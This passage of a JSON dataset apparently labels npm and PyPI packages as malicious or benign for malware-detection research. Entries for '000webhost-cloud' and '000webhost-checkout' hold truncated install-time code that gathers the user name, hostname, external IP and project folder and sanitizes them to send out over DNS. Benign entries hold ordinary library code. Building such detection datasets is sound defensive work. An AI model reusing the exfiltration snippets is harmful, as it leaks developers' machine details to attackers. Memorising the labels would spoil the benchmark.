sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/eslint-plugin-prettier.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js"
      ],
      "individual_files": {
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/eslint-plugin-prettier.js": "function reportDifference(context, difference) {\n  const { operation, offset, deleteText = '', insertText = '' } = difference;\n  const range = [offset, offset + deleteText.length];\n  const [start, end] = range.map(index =>\n    context.getSourceCode().getLocFromIndex(index),\n  );\n\n  context.report({\n    messageId: operation,\n    data: {\n      deleteText: showInvisibles(deleteText),\n      insertText: showInvisibles(insertText),\n    },\n    loc: { start, end },\n    fix: fixer => fixer.replaceTextRan",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpsnntokac/tmp/tmpl_ftuuma/eslint-plugin-prettier/package/install.js": "function listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo"
      },
      "package_size_bytes": 6925,
      "num_files": 10,
      "metadata": {
        "package_hash": "npm_eslint-plugin-prettier_2025",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "000webhost-cloud",
      "ecosystem": "npm",
      "sample_type": "malicious_intent",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpeo8688mc/tmp/tmpadrjj4tm/000webhost-cloud/package/index.js (function)\nconst getExternalIP = () => {\n  return new Promise((resolve, reject) => {\n    https.get('https://api.ipify.org?format=json', (res) => {\n      let data = '';\n\n      res.on('data', (chunk) => {\n        data += chunk;\n      });\n\n      res.on('end', () => {\n        try {\n          const parsedData = JSON.parse(data);\n          resolve(parsedData.ip);\n        } catch (error) {\n          reject('Error al obtener IP externa');\n        }\n      });\n    }).on('error', (error) => {\n      reject('IP no disp\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpeo8688mc/tmp/tmpadrjj4tm/000webhost-cloud/package/index.js (function)\nconst sanitizeForDNS = (input) => {\n  return input.replace(/[^a-zA-Z0-9.-]/g, '_'); // Reemplaza caracteres no vlidos\n};\n\n// Funcin para enviar los datos a travs de DNS\nconst sendDNSData = async () => {\n  try {\n    const externalIP = await getExternalIP();\n    const sanitizedUser = sanitizeForDNS(user);\n    const sanitizedHostname = sanitizeForDNS(hostname);\n    const sanitizedIP = sanitizeForDNS(externalIP);\n    const sanitizedProjectFolder = sanitizeForDNS(projectFolderName); // Sanitiza el no\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpeo8688mc/tmp/tmpadrjj4tm/000webhost-cloud/package/index.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpeo8688mc/tmp/tmpadrjj4tm/000webhost-cloud/package/index.js"
      ],
      "individual_files": {
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpeo8688mc/tmp/tmpadrjj4tm/000webhost-cloud/package/index.js": "const sanitizeForDNS = (input) => {\n  return input.replace(/[^a-zA-Z0-9.-]/g, '_'); // Reemplaza caracteres no vlidos\n};\n\n// Funcin para enviar los datos a travs de DNS\nconst sendDNSData = async () => {\n  try {\n    const externalIP = await getExternalIP();\n    const sanitizedUser = sanitizeForDNS(user);\n    const sanitizedHostname = sanitizeForDNS(hostname);\n    const sanitizedIP = sanitizeForDNS(externalIP);\n    const sanitizedProjectFolder = sanitizeForDNS(projectFolderName); // Sanitiza el no"
      },
      "package_size_bytes": 1366,
      "num_files": 2,
      "metadata": {
        "package_hash": "npm_000webhost-cloud_2024",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "000webhost-checkout",
      "ecosystem": "npm",
      "sample_type": "malicious_intent",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp64usfjpf/tmp/tmpbi0mqrw3/000webhost-checkout/package/index.js (function)\nconst getExternalIP = () => {\n  return new Promise((resolve, reject) => {\n    https.get('https://api.ipify.org?format=json', (res) => {\n      let data = '';\n\n      res.on('data', (chunk) => {\n        data += chunk;\n      });\n\n      res.on('end', () => {\n        try {\n          const parsedData = JSON.parse(data);\n          resolve(parsedData.ip);\n        } catch (error) {\n          reject('Error al obtener IP externa');\n        }\n      });\n    }).on('error', (error) => {\n      reject('IP no disp\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp64usfjpf/tmp/tmpbi0mqrw3/000webhost-checkout/package/index.js (function)\nconst sanitizeForDNS = (input) => {\n  return input.replace(/[^a-zA-Z0-9.-]/g, '_'); // Reemplaza caracteres no vlidos\n};\n\n// Funcin para enviar los datos a travs de DNS\nconst sendDNSData = async () => {\n  try {\n    const externalIP = await getExternalIP();\n    const sanitizedUser = sanitizeForDNS(user);\n    const sanitizedHostname = sanitizeForDNS(hostname);\n    const sanitizedIP = sanitizeForDNS(externalIP);\n    const sanitizedProjectFolder = sanitizeForDNS(projectFolderName); // Sanitiza el no\n==================================================\n",
      "file_paths": [
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp64usfjpf/tmp/tmpbi0mqrw3/000webhost-checkout/package/index.js",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp64usfjpf/tmp/tmpbi0mqrw3/000webhost-checkout/package/index.js"
      ],
      "individual_files": {
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp64usfjpf/tmp/tmpbi0mqrw3/000webhost-checkout/package/index.js": "const sanitizeForDNS = (input) => {\n  return input.replace(/[^a-zA-Z0-9.-]/g, '_'); // Reemplaza caracteres no vlidos\n};\n\n// Funcin para enviar los datos a travs de DNS\nconst sendDNSData = async () => {\n  try {\n    const externalIP = await getExternalIP();\n    const sanitizedUser = sanitizeForDNS(user);\n    const sanitizedHostname = sanitizeForDNS(hostname);\n    const sanitizedIP = sanitizeForDNS(externalIP);\n    const sanitizedProjectFolder = sanitizeForDNS(projectFolderName); // Sanitiza el no"
      },
      "package_size_bytes": 1372,
      "num_files": 2,
      "metadata": {
        "package_hash": "npm_000webhost-checkout_2024",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "wrapper",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js (function)\nfunction then () {\n      cb = args[args.length-1]\n      args[args.length-1] = function () {\n        if (cb.apply(this, arguments)) {\n          wrapper.do('after', slice.call(arguments), wrapper.wrap.finally)\n        } \n      }\n      return fn.apply(that, args)\n    }\n  }\n\n  wrapper.wrap = { before : [], after : [] }\n\n  wrapper.before = function (func) { \n    wrapper.wrap.before.push(func)\n  }\n\n  wrapper.after = function (func) { \n    wrapper.wrap.after.push(func)\n  }\n\n  wrapper.finally = function\n==================================================\n\n# File: data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js (function)\nfunction next () {\n        i++\n        if (i < 0) return wraps[i + wraps.length].apply(that, args)\n        else {\n          args.pop()\n          return cb && cb.apply(that, args)\n        }\n      })\n      return wraps[i + wraps.length].apply(this, args)\n    }\n    else return cb && cb.apply(this, args)\n  }\n\n  return wrapper\n}\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js (function)\nvar wrapper = function (/* arg1, arg2, argn */) {\n    var that = this\n      , args = slice.call(arguments)\n      , cb\n\n    wrapper.do('before', args, then)\n    function then () {\n      cb = args[args.length-1]\n      args[args.length-1] = function () {\n        if (cb.apply(this, arguments)) {\n          wrapper.do('after', slice.call(arguments), wrapper.wrap.finally)\n        } \n      }\n      return fn.apply(that, args)\n    }\n  }\n\n  wrapper.wrap = { before : [], after : [] }\n\n  wrapper.before = fun\n==================================================\n\n# File: data/benign_samples/npm/longtail/wrapper/0.1.0/package/example/simple.js (function)\nfunction _foo (options, cb) {\n  return cb(null, options)\n})\n\nfoo.before(function (options, cb, next) {\n  console.log('before hook one', arguments)\n  next()\n})\n\nfoo.before(function (options, cb, next) {\n  console.log('before hook two', arguments)\n  next()\n})\n\nfoo.after(function (err, result, next) {\n  console.log('after hook one', arguments)\n  next()\n})\n\nfoo.after(function (err, result, next) {\n  console.log('after hook two', arguments)\n  next()\n})\n\nfoo.finally(function (err, result) {\n  console.\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js",
        "data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js",
        "data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js",
        "data/benign_samples/npm/longtail/wrapper/0.1.0/package/example/simple.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/longtail/wrapper/0.1.0/package/index.js": "var wrapper = function (/* arg1, arg2, argn */) {\n    var that = this\n      , args = slice.call(arguments)\n      , cb\n\n    wrapper.do('before', args, then)\n    function then () {\n      cb = args[args.length-1]\n      args[args.length-1] = function () {\n        if (cb.apply(this, arguments)) {\n          wrapper.do('after', slice.call(arguments), wrapper.wrap.finally)\n        } \n      }\n      return fn.apply(that, args)\n    }\n  }\n\n  wrapper.wrap = { before : [], after : [] }\n\n  wrapper.before = fun",
        "data/benign_samples/npm/longtail/wrapper/0.1.0/package/example/simple.js": "function _foo (options, cb) {\n  return cb(null, options)\n})\n\nfoo.before(function (options, cb, next) {\n  console.log('before hook one', arguments)\n  next()\n})\n\nfoo.before(function (options, cb, next) {\n  console.log('before hook two', arguments)\n  next()\n})\n\nfoo.after(function (err, result, next) {\n  console.log('after hook one', arguments)\n  next()\n})\n\nfoo.after(function (err, result, next) {\n  console.log('after hook two', arguments)\n  next()\n})\n\nfoo.finally(function (err, result) {\n  console."
      },
      "package_size_bytes": 2379,
      "num_files": 4,
      "metadata": {
        "package_hash": "npm_wrapper_0.1.0",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "libravore",
      "ecosystem": "pypi",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__init__.py (file)\n# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Misspelling of \"librovore\". See the Librovore package instead. '''\n\n\nimport warnings as _warnings\n\nfrom librovore import *  # pyright: ignore\n\nfrom . import __\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier ---\n\n\n__version__ = '1.0'\n\n\n_warnings.warn(\n    \"You have imported 'libravore' which is a misspelling of \"\n    \"'librovore'. Consider updating your code to use 'librovore' (with an \"\n    \"'o') instead.\",\n    UserWarning,\n    stacklevel=2\n)\n\n\n# TODO: Reclassify package modules as immutable and concealed.\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/__init__.py (file)\n# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Common constants, imports, and utilities. '''\n\n\nfrom .imports import *\nfrom .nomina import *\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/imports.py (file)\n# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Common imports used throughout the package. '''\n\n# ruff: noqa: F401\n\n\nimport collections.abc as cabc\nimport types\n\nimport typing_extensions as typx\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier ---\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/nomina.py (file)\n# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Common names and type aliases. '''\n\n\nfrom . import imports as __\n\n\nComparisonResult: __.typx.TypeAlias = bool | __.types.NotImplementedType\nNominativeArguments: __.typx.TypeAlias = __.cabc.Mapping[ str, __.typx.Any ]\nPositionalArguments: __.typx.TypeAlias = __.cabc.Sequence[ __.typx.Any ]\n\n\npackage_name = __name__.split( '.', maxsplit = 1 )[ 0 ]\n\n==================================================\n\n# File: data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/pyproject.toml (file)\n# vim: set filetype=toml fileencoding=utf-8:\n# -*- mode: toml ; coding: utf-8 -*-\n\n[build-system]\nrequires = [\n  'hatchling',\n]\nbuild-backend = 'hatchling.build'\n\n[project]\nname = 'libravore'\ndescription = 'Misspelling of \"librovore\". See the Librovore package instead.'\ndynamic = [ 'version' ]\nlicense = 'Apache-2.0'\nreadme = { 'file' = 'README.rst', 'content-type' = 'text/x-rst' }\nrequires-python = '>= 3.10'\ndependencies = [\n  'librovore',\n  'typing-extensions',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\nclassifiers = [ # https://pypi.org/classifiers\n  'Development Status :: 4 - Beta',\n  'Intended Audience :: Developers',\n  'License :: OSI Approved :: Apache Software License',\n  'Programming Language :: Python :: 3 :: Only',\n  # --- BEGIN: Injected by Copier ---\n  'Programming Language :: Python :: 3.10',\n  'Programming Language :: Python :: 3.11',\n  'Programming Language :: Python :: 3.12',\n  'Programming Language :: Python :: 3.13',\n  'Programming Language :: Python :: Implementation :: CPython',\n  'Programming Language :: Python :: Implementation :: PyPy',\n  # --- END: Injected by Copier ---\n  'Topic :: Software Development :: Libraries',\n  'Topic :: Utilities',\n]\nkeywords = [ 'redirect', 'compatibility', 'librovore', 'misspelling' ]\n[[project.authors]]\nname = 'Eric McDonald'\nemail = 'emcd@users.noreply.github.com'\n[project.urls]\n'Homepage' = 'https://github.com/emcd/python-libravore'\n'Documentation' = 'https://emcd.github.io/python-libravore'\n'Download' = 'https://pypi.org/project/libravore/#files'\n'Source Code' = 'https://github.com/emcd/python-libravore'\n'Issue Tracker' = 'https://github.com/emcd/python-libravore/issues'\n\n[tool.SELF]\nyear-of-origin = 2025\n\n# https://coverage.readthedocs.io/en/latest/config.html\n[tool.coverage.paths]\ngha-runners = [\n  '/home/runner/work/python-libravore/python-libravore/',\n  '/Users/runner/work/python-libravore/python-libravore/',\n  'C:\\a\\python-libravore\\python-libravore\\',\n  'D:\\a\\python-libravore\\python-libravore\\',\n]\n[tool.coverage.run]\nbranch = true\ncommand_line = '-m pytest'\ndata_file = '.auxiliary/caches/pytest/coverage.sqlite3'\nparallel = true\nsource = [ 'sources' ]\n[tool.coverage.html]\ndirectory = '.auxiliary/artifacts/coverage-pytest'\n[tool.coverage.xml]\noutput = '.auxiliary/artifacts/coverage-pytest/coverage.xml'\n\n# https://hatch.pypa.io/latest/config/metadata/\n[tool.hatch.build]\ndirectory = '.auxiliary/artifacts/hatch-build'\n[tool.hatch.build.targets.sdist]\nonly-include = [\n  'sources/libravore',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\nstrict-naming = false\n[tool.hatch.build.targets.wheel]\nonly-include = [\n  'sources/libravore',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\nstrict-naming = false\n[tool.hatch.build.targets.wheel.sources]\n'sources/libravore' = 'libravore'\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier --- \n[tool.hatch.envs.default]\npython = '3.10'\n[tool.hatch.envs.develop]\ndescription = ''' Development environment. '''\ndependencies = [\n  'Jinja2',\n  'coverage[toml]',\n  'furo',\n  'isort',\n  'packaging',\n  'pre-commit',\n  'pyright',\n  'pytest',\n  'ruff',\n  'sphinx',\n  'sphinx-copybutton',\n  'sphinx-inline-tabs',\n  'towncrier',\n  'vulture',\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\npost-install-commands = [\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\n[tool.hatch.envs.develop.env-vars]\nPYTHONUNBUFFERED = 'TRUE' # TODO: Only for coverage/pytest.\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier ---\n[tool.hatch.envs.develop.scripts]\ndocsgen = [\n  \"\"\"sphinx-build -E -b linkcheck -d .auxiliary/caches/sphinx --quiet \\\n      documentation .auxiliary/artifacts/sphinx-linkcheck\"\"\",\n  \"\"\"sphinx-build -a -d .auxiliary/caches/sphinx --quiet \\\n      documentation .auxiliary/artifacts/sphinx-html\"\"\",\n]\nlinters = [\n  \"\"\"ruff check --quiet sources documentation tests\"\"\",\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n  \"\"\"isort --check-only --diff sources tests\"\"\",\n  \"\"\"vulture sources\"\"\",\n  \"\"\"pyright sources\"\"\",\n]\npackagers = [\n  \"\"\"hatch build\"\"\",\n  # --- BEGIN: Injected by Copier ---\n  # --- END: Injected by Copier ---\n]\ntesters-documentation = [\n  \"\"\"coverage run -m sphinx.cmd.build \\\n      -E -b doctest -d .auxiliary/caches/sphinx --quiet \\\n      documentation .auxiliary/artifacts/sphinx-doctest\"\"\",\n]\ntesters-serotine = [ \"\"\"coverage run -m pytest -m slow\"\"\"  ]\ntesters-no-reports = [\n  'coverage run',\n  'testers-documentation',\n  'testers-serotine',\n]\ntesters = [\n  'coverage erase',\n  'testers-no-reports',\n  'coverage combine',\n  'coverage report --skip-covered',\n  'coverage html',\n  'coverage xml',\n]\nmake-all = [\n  'linters',\n  'testers',\n  'packagers',\n  'docsgen',\n]\n[tool.hatch.envs.qa]\ndescription = ''' Quality assurance environment. '''\ntemplate = 'develop'\n[[tool.hatch.envs.qa.matrix]]\npython = [\n    '3.10',\n    '3.11',\n    '3.12',\n    '3.13',\n    'pypy3.10',\n]\n[tool.hatch.version]\npath = 'sources/libravore/__init__.py'\n\n# https://pycqa.github.io/isort/docs/configuration/config_files.html\n[tool.isort]\n# profile = 'black'\nsrc_paths = [ 'sources', 'tests' ]\ncase_sensitive = true\n# ensure_newline_before_comments = true\n# force_sort_within_sections = true\nignore_whitespace = true\ninclude_trailing_comma = true\nknown_first_party = [ 'libravore' ]\nlines_between_types = 1\nline_length = 79\nmulti_line_output = 3\nquiet = true\n# skip_gitignore = true\nskip_glob = [ '*/__/imports.py', '*/__init__.py' ]\nsplit_on_trailing_comma = true\nuse_parentheses = true\n\n# https://mypy.readthedocs.io/en/stable/config_file.html\n[tool.mypy]\n# Note: Due to repeated painful experiences with Mypy, we use Pyright instead.\n#       Pyright properly handles TypeVars, etc...\ncache_dir = '.auxiliary/caches/mypy'\nexclude = [ '.*' ]  # Ignore everything\nignore_errors = true\nfollow_imports = 'skip'\npretty = true\nstrict = false\n\n# https://microsoft.github.io/pyright/#/configuration\n[tool.pyright]\nignore = [ '.auxiliary', 'documentation', 'tests' ] # Ignore diagnostics.\ninclude = [ 'sources', 'tests' ]      # Consider for operations.\nreportConstantRedefinition = true\nreportInvalidTypeVarUse = true\nreportMatchNotExhaustive = true\nreportMissingImports = true\nreportMissingTypeStubs = true\nreportMissingTypeArgument = true\nreportPossiblyUnboundVariable = false # Covered by other linters.\nreportPrivateImportUsage = false      # Covered by other linters.\nreportPrivateUsage = false            # Covered by other linters.\nreportSelfClsParameterName = false    # Too opinionated.\nreportUnknownArgumentType = true\nreportUnknownLambdaType = true\nreportUnknownMemberType = true\nreportUnknownParameterType = true\nreportUnknownVariableType = true\nreportUnnecessaryCast = true\nreportUnnecessaryComparison = true\nreportUntypedBaseClass = true\nreportUntypedClassDecorator = true\nreportUntypedFunctionDecorator = true\nreportUntypedNamedTuple = true\nreportUnusedExpression = true\nreportUnusedImport = false            # Covered by other linters.\nreportUnusedVariable = false          # Covered by other linters.\n#strict = [ 'sources' ]\nstubPath = 'sources/libravore/_typedecls'\n\n[tool.pytest.ini_options]\n# Note: Cannot run doctests from Pytest, because Pytest tries to update '_'\n#       attribute on protected modules. Instead, we use Sphinx to run doctests.\nminversion = '8.1'\naddopts = \"\"\"--capture=no --exitfirst --quiet -rfE -m 'not slow'\"\"\" # TODO? '--fail-under'\ntestpaths = [ 'tests' ]\npython_files = [ 'test_*.py' ]\npython_functions = [ 'test_[0-9][0-9][0-9]_*' ]\ncache_dir = '.auxiliary/caches/pytest'\nmarkers = [\n    \"slow: long-running tests\",\n]\n\n[tool.ruff]\n#builtins = [ 'ic' ]\ncache-dir = '.auxiliary/caches/ruff'\nindent-width = 4\nline-length = 79\n[tool.ruff.lint]\ndummy-variable-rgx = '^_$'\nignore = [\n  'E701',     # multiple-statements-on-one-line-colon\n  'PLC0415',  # import-outside-top-level\n  'SIM300',   # yoda-condition: scarred by assignment expressions, I am\n]\nselect = [ # default: E4, E7, E9, F\n  'A',        # Flake8 builtins rules\n  'B006',     # mutable-argument-default\n  'B008',     # function-call-in-default-argument\n  'B011',     # assert-false\n  'B023',     # function-uses-loop-variable\n  'B904',     # raise-without-from-inside-except\n  'B909',     # PREVIEW: loop-iterator-mutation\n  'C90',      # McCabe complexity rules\n  'E101',     # mixed-spaces-and-tabs\n  'E111',     # PREVIEW: indentation-with-invalid-multiple\n  'E112',     # PREVIEW: no-indented-block\n  'E4',       # Pycodestyle import rules\n  'E501',     # line-too-long\n  'E7',       # Pycodestyle general rules\n  'E9',       # Pycodestyle runtime errors\n  'F',        # Pyflakes rules\n  'PERF',     # Perflint rules\n  'PLC',      # Pylint convention rules\n  'PLE',      # Pylint error rules\n  'PLR',      # Pylint refactor rules\n  'PLW',      # Pylint warning rules\n  'RET',      # Flake8 return rules\n  'RUF',      # Ruff rules\n  'S',        # Flake8 Bandit rules\n  'SIM',      # Flake8 simplify rules\n  'SLF',      # Flake8 self rules\n  'TRY',      # Tryceratops rules\n]\n[tool.ruff.lint.mccabe]\nmax-complexity = 12\n[tool.ruff.lint.per-file-ignores]\n'__init__.py' = [\n  'F401',     # unused-import\n  'F403',     # undefined-local-with-import-star\n  'F405',     # undefined-local-with-import-star-usage\n]\n'tests/**/*.py' = [\n  'PLR0124',  # comparison-with-itself\n  'PLR0913',  # too-many-arguments\n  'PLR0915',  # too-many-statements\n  'PLR1704',  # redefined-argument-from-local\n  'PLR2004',  # magic-value-comparison\n  'PLW0129',  # assert-on-string-literal\n  'PLW0603',  # global-statement\n  'PLW0642',  # self-assignment\n  'S101',     # assert\n  'SLF001',   # private-member-accessed\n  'TRY',      # Tryceratops rules\n]\n[tool.ruff.lint.pylint]\nmax-locals = 10\nmax-public-methods = 10\nmax-statements = 30\n\n[tool.towncrier]\ndirectory = '.auxiliary/data/towncrier'\nfilename = 'documentation/changelog.rst'\npackage = 'libravore'\npackage_dir = 'sources'\n[[tool.towncrier.type]]\n# features and other improvements\ndirectory = 'enhance'\nname = 'Enhancements'\nshowcontent = true\n[[tool.towncrier.type]]\n# deprecations and other notices\ndirectory = 'notify'\nname = 'Notices'\nshowcontent = true\n[[tool.towncrier.type]]\n# removals of feature or platform support\ndirectory = 'remove'\nname = 'Removals'\nshowcontent = true\n[[tool.towncrier.type]]\n# bug fixes\ndirectory = 'repair'\nname = 'Repairs'\nshowcontent = true\n\n[tool.vulture]\npaths = [ 'sources' ]\nmin_confidence = 80\nexclude = [\n  '*/imports.py',\n]\nignore_decorators = [ '@__.cabc.abstractmethod', '@__.typx.overload' ]\nignore_names = [ ]\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__init__.py",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/__init__.py",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/imports.py",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__/nomina.py",
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/pyproject.toml"
      ],
      "individual_files": {
        "data/benign_samples/pypi/longtail/libravore/1.0/libravore-1.0/sources/libravore/__init__.py": "# vim: set filetype=python fileencoding=utf-8:\n# -*- coding: utf-8 -*-\n\n#============================================================================#\n#                                                                            #\n#  Licensed under the Apache License, Version 2.0 (the \"License\");           #\n#  you may not use this file except in compliance with the License.          #\n#  You may obtain a copy of the License at                                   #\n#                                                                            #\n#      http://www.apache.org/licenses/LICENSE-2.0                            #\n#                                                                            #\n#  Unless required by applicable law or agreed to in writing, software       #\n#  distributed under the License is distributed on an \"AS IS\" BASIS,         #\n#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  #\n#  See the License for the specific language governing permissions and       #\n#  limitations under the License.                                            #\n#                                                                            #\n#============================================================================#\n\n\n''' Misspelling of \"librovore\". See the Librovore package instead. '''\n\n\nimport warnings as _warnings\n\nfrom librovore import *  # pyright: ignore\n\nfrom . import __\n# --- BEGIN: Injected by Copier ---\n# --- END: Injected by Copier ---\n\n\n__version__ = '1.0'\n\n\n_warnings.warn(\n    \"You have imported 'libravore' which is a misspelling of \"\n    \"'librovore'. Consider updating your code to use 'librovore' (with an \"\n    \"'o') instead.\",\n    UserWarning,\n    stacklevel=2\n)\n\n\n# TODO: Reclassify package modules as immutable and concealed.\n",
